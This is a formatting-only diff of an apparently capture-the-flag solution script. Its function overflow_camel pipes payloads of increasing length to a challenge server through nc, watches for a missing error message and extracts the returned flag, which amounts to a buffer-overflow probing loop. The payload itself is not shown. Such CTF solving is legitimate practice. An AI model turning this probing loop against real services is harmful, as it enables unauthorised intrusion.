@@ -3,13 +3,7 @@ from subprocess import TimeoutExpired
 
 import numpy as np
 
-from warmup.constants import (
-    BIRTHDATE,
-    CAMEL,
-    PORT,
-    SERVER,
-    WRONG_CAMEL_ERROR,
-)
+from warmup.constants import BIRTHDATE, CAMEL, PORT, SERVER, WRONG_CAMEL_ERROR
 
 
 def overflow_camel(valid_email: str) -> str | None:
@@ -23,23 +17,12 @@ def overflow_camel(valid_email: str) -> str | None:
         print(f"[{attempt:0{digits}d}/{total_attempts}] {length:,}")
 
         try:
-            result = subprocess.run(
-                ["nc", SERVER, str(PORT)],
-                capture_output=True,
-                check=True,
-                input=payload,
-                text=True,
-                timeout=5,
-            )
+            result = subprocess.run(["nc", SERVER, str(PORT)], capture_output=True, check=True, input=payload, text=True, timeout=5)
         except TimeoutExpired:
             print("[TIMEOUT]")
             continue
 
-        if (
-            (stdout := result.stdout) is not None
-            and (stdout := stdout.strip())
-            and WRONG_CAMEL_ERROR not in stdout
-        ):
+        if (stdout := result.stdout) is not None and (stdout := stdout.strip()) and WRONG_CAMEL_ERROR not in stdout:
             print(stdout)
             flag = stdout.split()[-1]
             return flag
